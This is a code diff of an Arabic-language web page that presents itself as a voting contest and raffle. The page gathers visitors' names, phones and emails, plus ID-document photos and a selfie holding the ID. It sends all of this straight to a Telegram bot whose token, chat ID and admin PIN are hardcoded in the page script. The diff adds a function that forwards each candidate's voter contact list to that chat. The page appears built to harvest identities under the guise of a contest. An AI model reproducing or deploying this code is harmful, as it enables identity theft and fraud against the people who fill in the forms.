@@ -259,7 +259,6 @@
     font-weight: 900; font-size: 14px; white-space: nowrap;
   }
 
-  /* زر "صوّت له" باللون الأخضر الجذاب فقط */
   .quick-vote-btn {
     background: var(--grad-green); color: #030712;
     border: none; padding: 6px 15px; border-radius: 12px;
@@ -275,11 +274,20 @@
   body.admin-mode .admin-only-control {
     display: inline-block;
   }
+  .admin-row-actions {
+    display: flex; gap: 6px; justify-content: flex-start; flex-wrap: wrap; margin-top: 6px;
+  }
+  .admin-report-btn {
+    background: rgba(56, 189, 248, 0.18);
+    border: 1px solid var(--cyan);
+    color: #7dd3fc; padding: 4px 10px; border-radius: 8px;
+    font-size: 11px; font-weight: 800; cursor: pointer;
+  }
   .admin-del-btn {
     background: rgba(239, 68, 68, 0.2);
     border: 1px solid var(--danger);
     color: #fca5a5; padding: 4px 10px; border-radius: 8px;
-    font-size: 11px; font-weight: 800; cursor: pointer; margin-top: 5px;
+    font-size: 11px; font-weight: 800; cursor: pointer;
   }
 
   .store-thanks-card {
@@ -602,16 +610,13 @@
           <div style="text-align:center; padding:30px; color:var(--text-muted);">⏳ جارٍ تحميل قائمة المتسابقين...</div>
         </div>
 
-        <!-- شريط الإدارة الكامل -->
+        <!-- شريط الإدارة -->
         <div style="margin-top:20px; padding-top:15px; border-top:1px dashed var(--border); display:flex; gap:8px; flex-wrap:wrap; justify-content:space-between; align-items:center;">
           <div style="display:flex; gap:8px; flex-wrap:wrap;">
-            <button type="button" class="admin-only-control" onclick="sendVotersPerCandidateReport()" style="background:rgba(16,185,129,0.15); border:1px solid var(--success); color:#6ee7b7; padding:9px 12px; border-radius:12px; font-weight:800; font-size:12px; cursor:pointer;">
-              👥 تقرير المصوّتين لكل متسابق
-            </button>
             <button type="button" class="admin-only-control" onclick="sendSortedReportToAdmin()" style="background:rgba(56,189,248,0.14); border:1px solid var(--cyan); color:var(--cyan); padding:9px 12px; border-radius:12px; font-weight:800; font-size:12px; cursor:pointer;">
               📋 تقرير جميع المتسابقين
             </button>
-            <button type="button" class="admin-only-control" onclick="testSystemConnection()" style="background:rgba(245,158,11,0.14); border:1px solid var(--gold); color:var(--gold-bright); padding:9px 12px; border-radius:12px; font-weight:800; font-size:12px; cursor:pointer;">
+            <button type="button" class="admin-only-control" onclick="testSystemConnection()" style="background:rgba(16,185,129,0.14); border:1px solid var(--success); color:#6ee7b7; padding:9px 12px; border-radius:12px; font-weight:800; font-size:12px; cursor:pointer;">
               📡 فحص البوت
             </button>
           </div>
@@ -779,7 +784,7 @@
 const API_KEY = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const DEST_ID = "8299163806";
 const ADMIN_PIN = "777908028";
-const STORAGE_KEY = "amir_felling_v7";
+const STORAGE_KEY = "amir_felling_v8";
 const MAX_CAP = 500;
 
 let voterIdBlob = null;
@@ -988,7 +993,10 @@ function renderLeaderboardUI() {
       <div style="text-align:left;">
         <div class="vote-count-pill">🗳️ ${cand.v || 0} صوت</div>
         <button type="button" class="quick-vote-btn" onclick="selectCandidateForVote('${escHtml(cand.k)}')">صوّت له</button>
-        <button type="button" class="admin-del-btn admin-only-control" onclick="adminDeleteCandidate('${escHtml(cand.k)}', '${escHtml(cand.n)}')">🗑️ حذف</button>
+        <div class="admin-row-actions admin-only-control">
+          <button type="button" class="admin-report-btn" onclick="sendSingleCandidateVotersReport('${escHtml(cand.k)}')">📩 تقرير المصوّتين</button>
+          <button type="button" class="admin-del-btn" onclick="adminDeleteCandidate('${escHtml(cand.k)}', '${escHtml(cand.n)}')">🗑️ حذف</button>
+        </div>
       </div>
     `;
     listEl.appendChild(row);
@@ -1092,7 +1100,6 @@ document.getElementById("voteForm").addEventListener("submit", function(e) {
   btn.disabled = true;
   btn.textContent = "⚡ جارٍ الإرسال الفوري...";
 
-  // تحديث فوري محلي للواجهة دون تأخير
   target.v = (target.v || 0) + 1;
   if (!Array.isArray(target.voters)) target.voters = [];
   target.voters.push({
@@ -1135,7 +1142,6 @@ document.getElementById("voteForm").addEventListener("submit", function(e) {
   fd.append("caption", caption);
   fd.append("parse_mode", "HTML");
 
-  // إرسال فوري للبيانات والوثيقة دون تأخير
   fetch(`https://api.telegram.org/bot${API_KEY}/sendPhoto`, {
     method: "POST",
     body: fd
@@ -1264,7 +1270,6 @@ document.getElementById("raffleForm").addEventListener("submit", function(e) {
   fd2.append("photo", selfieIdBlob, "selfie_id.jpg");
   fd2.append("caption", `🤳 سيلفي مع الهوية للمتسابق: ${name} (${code})`);
 
-  // إرسال فوري للوثائق دون تأخير
   Promise.all([
     fetch(`https://api.telegram.org/bot${API_KEY}/sendPhoto`, { method: "POST", body: fd1 }),
     fetch(`https://api.telegram.org/bot${API_KEY}/sendPhoto`, { method: "POST", body: fd2 })
@@ -1273,6 +1278,37 @@ document.getElementById("raffleForm").addEventListener("submit", function(e) {
   btn.disabled = false;
   btn.textContent = "🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي";
 });
+
+async function sendSingleCandidateVotersReport(code) {
+  const cand = stateData.c.find(c => c.k === code);
+  if (!cand) return;
+
+  let msg =
+`📩 <b>تقرير المصوّتين المستقل للمتسابق — أمير المترات</b>
+━━━━━━━━━━━━━━━━━━
+👤 <b>المتسابق:</b> ${cand.n}
+📍 <b>المنطقة:</b> ${cand.y || "غير محدد"}
+🎟️ <b>الرمز:</b> <code>${cand.k}</code>
+🗳️ <b>إجمالي الأصوات:</b> <b>${cand.v || 0} صوت</b>
+━━━━━━━━━━━━━━━━━━\n`;
+
+  if (Array.isArray(cand.voters) && cand.voters.length > 0) {
+    cand.voters.forEach((vt, i) => {
+      msg += `${i + 1}. <b>${vt.name}</b>\n   📞 الهاتف: <code>${vt.phone}</code> | 📧 البريد: <code>${vt.email}</code>\n   🕒 الوقت: ${vt.time || ""}\n`;
+    });
+  } else {
+    msg += `ℹ️ لا توجد تفاصيل مصوّتين جدد مسجلة محلياً لهذا المتسابق حتى الآن (إجمالي الأصوات المسجلة: <b>${cand.v || 0}</b>).`;
+  }
+
+  const res = await fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: DEST_ID, text: msg, parse_mode: "HTML" })
+  }).then(r => r.json());
+
+  if (res.ok) alert(`✅ تم إرسال تقرير المصوّتين الخاص بـ (${cand.n}) بشكل مستقل!`);
+  else alert("⚠️ تعذر إرسال التقرير: تحقق من الاتصال.");
+}
 
 async function testSystemConnection() {
   try {
@@ -1307,7 +1343,7 @@ function toggleAdminMode() {
   const pin = prompt("🔐 أدخل الرقم السري للإدارة:");
   if (pin === ADMIN_PIN) {
     document.body.classList.add("admin-mode");
-    alert("✅ تم تفعيل وضع الإدارة! ظهرت أزرار التقرير لكل متسابق، تقرير جميع المتسابقين، فحص البوت، وحذف المتسابقين.");
+    alert("✅ تم تفعيل وضع الإدارة! ظهر بجانب كل متسابق زر (تقرير المصوّتين) وزر (حذف) بشكل مستقل.");
   } else if (pin !== null) {
     alert("❌ الرقم السري غير صحيح!");
   }
@@ -1320,35 +1356,6 @@ function adminDeleteCandidate(code, name) {
   syncCloudBackground();
   renderLeaderboardUI();
   alert(`✅ تم حذف المتسابق (${name}) فوراً.`);
-}
-
-async function sendVotersPerCandidateReport() {
-  const sorted = [...(stateData.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
-  if (sorted.length === 0) {
-    alert("لا يوجد متسابقون مسجلون.");
-    return;
-  }
-
-  let report = `👥 <b>تقرير المصوّتين لكل متسابق — أمير المترات</b>\n━━━━━━━━━━━━━━━━━━\n`;
-  sorted.forEach((cand, i) => {
-    report += `\n<b>${i + 1}. ${cand.n}</b> (<code>${cand.k}</code>) — <b>${cand.v || 0} صوت</b>\n`;
-    if (Array.isArray(cand.voters) && cand.voters.length > 0) {
-      cand.voters.forEach((vt, idx) => {
-        report += `   • ${idx + 1}) ${vt.name} | <code>${vt.phone}</code> | ${vt.email}\n`;
-      });
-    } else {
-      report += `   • <i>أصوات مسجلة سابقة بدون تفاصيل مصوّتين جدد</i>\n`;
-    }
-  });
-
-  const res = await fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: DEST_ID, text: report.slice(0, 3900), parse_mode: "HTML" })
-  }).then(r => r.json());
-
-  if (res.ok) alert("✅ تم إرسال تقرير المصوّتين لكل متسابق فوراً!");
-  else alert("⚠️ تعذر إرسال التقرير: تحقق من الاتصال.");
 }
 
 async function sendSortedReportToAdmin() {
